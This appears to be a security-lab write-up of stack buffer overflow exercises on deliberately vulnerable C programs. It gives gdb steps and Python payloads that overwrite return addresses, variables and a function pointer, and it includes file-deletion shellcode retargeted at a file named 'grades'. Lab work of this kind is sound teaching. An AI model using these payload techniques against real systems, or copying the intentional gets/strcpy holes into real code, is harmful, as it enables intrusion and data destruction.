# Attacks
___
Firstly, run the docker image
```bash
docker run -it --privileged -v $HOME/Seclabs:/home/seed/seclabs img4lab
```
## Bof1.c 
***
```c
#include<stdio.h>
#include<unistd.h>
void secretFunc()
{
    printf("Congratulation!\n:");
}
int vuln(){
    char array[200];
    printf("Enter text:");
    gets(array);
    return 0;
}
int main(int argc, char*argv[]){
    if (argv[1]==0){
        printf("Missing arguments\n");
    }
    vuln();
    return 0;
}
```
Firstly, we need to compile the code.
```shell script --compile
$ gcc -g bof1.c -o bof1,out -fno-stack-protector -mpreferred-stack-boundary=2
```
Then, we open the binary in gdb.
```shell script --gdb
$ gdb -q ./bof1.out
```
In order to run the secretFunc, we need to overwrite the return address of the vuln function with the address of the secretFunc.
And to do that we need to find the address of the secretFunc.
```shell script --gdb-peda
gdb-peda$ p secretFunc
```
output:
```shell script --gdb-peda --output
$1 = {void ()} 0x804846b <secretFunc>
```
We know the stack frame of the vuln function
![stack-frame](https://github.com/user-attachments/assets/f958d795-a5c0-4699-8f7a-29dbe3fe507e)

We know the array is 200 bytes long, and ebp is 4 bytes long, so we need to overwrite 204 bytes to reach the return address.
```shell script
$ echo $(python -c 'print "A"*204 + "\x6b\x84\x04\x08"') | ./bof1.out XXXX
```
output:
```shell script --output
Enter text:Congratulation!
Segmentation fault
```
## Bof2.c
***
```c
#include <stdlib.h>
#include <stdio.h>

void main(int argc, char *argv[])
{
  int var;
  int check = 0x04030201;
  char buf[40];

  fgets(buf,45,stdin);

  printf("\n[buf]: %s\n", buf);
  printf("[check] 0x%x\n", check);

  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");

  if (check == 0xdeadbeef)
   {
     printf("Yeah! You win!\n");
   }
}
```
Firstly, we need to compile the code.
```shell script --compile
$ gcc -g bof2.c -o bof2.out -fno-stack-protector -mpreferred-stack-boundary=2
```
We know the stack frame of the main function
![stack-frame](https://github.com/user-attachments/assets/43658cfe-612d-4506-9403-d99d41aa7a76)

We know the array is 40 bytes long, so we need to overwrite 40 bytes to reach the check variable.
```shell script
$ echo $(python -c 'print "A"*40 + "\x01\x02\x03\x04"') | ./bof2.out
Let's try to get to the first if statement
```
output:
```shell script --output

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
[check] 0xddadbeef

You are on the right way!
```
Now, let's try to reach the second if statement.
```shell script
$ echo $(python -c 'print "A"*40 + "\xef\xbe\xad\xde"') | ./bof2.out
```
output:
```shell script --output

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
[check] 0xdeadbeef
Yeah! You win!
```
## Bof3.c
***
```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void shell() {
    printf("You made it! The shell() function is executed\n");
}

void sup() {
    printf("Congrat!\n");
}

void main()
{ 
    int var;
    void (*func)()=sup;
    char buf[128];
    fgets(buf,133,stdin);
    func();
}
```
Firstly, we need to compile the code.
```shell script --compile
$ gcc -g bof3.c -o bof3.out -fno-stack-protector -mpreferred-stack-boundary=2
```
Then, we open the binary in gdb.
```shell script --gdb
$ gdb -q ./bof3.out
```
In order to run the shell function, we need to overwrite the func pointer with the address of the shell function.
And to do that we need to find the address of the shell or func function.
```shell script --gdb-peda
gdb-peda$ p shell
```
output:
```shell script --gdb-peda --output
$1 = {void ()} 0x804845b <shell>
```
We know the stack frame of the main function
![stack-frame](https://github.com/user-attachments/assets/e4cb0cca-4d13-46b9-8625-b42baa954888)

We know the array is 128 bytes long and void pointer points to func which is 4 bytes long.
So we only need to overwrite 128 bytes to reach the func pointer and then overwrite it with the address of the shell function.
```shell script
$ echo $(python -c 'print "A"*128 + "\x5b\x84\x04\x08"') | ./bof3.out
```
output:
```shell script --output
You made it! The shell() function is executed
```
## file_del.asm
***
```asm
; delete dummyfile in nasm

section .text
global _start
_start:
    jmp short ender
starter:
    mov eax,10
    mov ebx,_filename
    int 0x80
_exit:
    mov eax,1
    int 0x80

ender:
    call starter
_filename:
    db 'dummyfile',0
```
Firstly, we need to compile the code.
```shell script --compile
$ nasm -g -f elf file_del.asm
```
```shell script --link
$ ld -m elf_i386 -o file_del file_del.o
```
Then, we open the binary in gdb.
```shell script --gdb
$ gdb -q ./file_del
```
We will set a breakpoint at the starter label.
```shell script --gdb-peda
gdb-peda$ b starter
```
Next, we run the program and check the value of the filename variable.
```shell script --gdb-peda
gdb-peda$ r
gdb-peda$ x/20xb _filename
```
output:
```shell script --gdb-peda --output
0x804807a <_filename>:  0x64    0x75    0x6d    0x6d    0x79    0x66    0x69    0x6c
0x8048082:      0x65    0x00    0x01    0x00    0x00    0x00    0x00    0x00
0x804808a:      0x0a    0x00    0x0e    0x00
```
We will now change the value of the filename variable to the value of the something else but be sure to keep the same length or less than the original value (like grades).
```shell script --gdb-peda
gdb-peda$ set {char[7]} _filename = "grades"
```
Now, we will check the value of the filename variable again.
```shell script --gdb-peda
gdb-peda$ x/20xb _filename
```
output:
```shell script --gdb-peda --output
0x804807a <_filename>:  0x67    0x72    0x61    0x64    0x65    0x73    0x00    0x6c
0x8048082:      0x65    0x00    0x01    0x00    0x00    0x00    0x00    0x00
0x804808a:      0x0a    0x00    0x0e    0x00
```
Now, we will continue the program and check if the file is deleted.
```shell script --gdb-peda
gdb-peda$ c
```
```shell script --shell
$ ls -l *grades
```
output:
```shell script --output
ls: cannot access '*grades': No such file or directory
```
## ctf.c
***
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void myfunc(int p, int q)
{
	char filebuf[64];
	FILE *f = fopen("flag1.txt","r");
	if (f == NULL) {
		printf("flag1 is missing!\n");
		exit(0);
	}
	fgets(filebuf,64,f);

	printf("myfunc is reached");
	if (p!=0x04081211)
	{
		printf(", but you fail to get the flag");
		return;
	}
	if (q!=0x44644262)
	{
		printf(", but you fail to get the flag");
		return;
	}
	printf("You got the flag\n"); 
}
void vuln(char* s)
{
	char buf[100];
	strcpy(buf,s);
	puts(buf);
}
int main(int argc, char* argv[])
{
	vuln(argv[1]);
    return 0;
} 
```
Firstly, we need to compile the code.
```shell script --compile
$ gcc -g ctf.c -o ctf.out -fno-stack-protector -mpreferred-stack-boundary=2
```
Then, we open the binary in gdb.
```shell script --gdb
$ gdb -q ./ctf.out
```
In order to run the myfunc function, we need to overwrite the return address of the vuln function with the address of the myfunc function.
And to do that we need to find the address of the myfunc function.
```shell script --gdb-peda
gdb-peda$ p myfunc
```
output:
```shell script --gdb-peda --output
$1 = {void (int, int)} 0x804851b <myfunc>
```
We know the stack frame of the vuln function
![stack-frame](https://github.com/user-attachments/assets/0467f57f-835a-4c9c-81b1-7206828f8ea9)

We know the array is 100 bytes long, and ebp is 4 bytes long, so we need to overwrite 104 bytes to reach the return address.
```shell script
$ echo $(python -c 'print "A"*104 + "\x1b\x85\x04\x08"') | ./ctf.out
```
output:
```shell script --output
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA♦
Segmentation fault
```
If we want to get the flag, we need to overwrite the p and q variables with the correct values.
To do that we need to consider what will happen when we call the return address in the vuln function is called.
![stack-frame](https://github.com/user-attachments/assets/69cc2212-877e-46a7-a4a7-1a51308ddc95)
![stack-frame](https://github.com/user-attachments/assets/fa9fbc65-9169-415a-89d9-0bed66a93f52)

As we can see, if we want to overwrite the p and q variables, we will need to overwrite 8 bytes in the main stack frame.
And to ensure that the Segmentation fault never happens, we will also to overwrite the variable s as the exit function address of the system.
```shell script --gdb-peda
gdb-peda$ p exit
```
output:
```shell script --gdb-peda --output
$1 = {<text variable, no debug info>} 0x80483e0 <exit@plt>
```
```shell script
$ ./ctf.out $(python -c 'print "A"*104 + "\x1b\x85\x04\x08" + "\xe0\x83\x04\x08" + "\x11\x12\x08\x04" + "\x62\x42\x64\x44"')
```
output:
```shell script --output
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��◄♦bBdD
myfunc is reachedYou got the flag
```
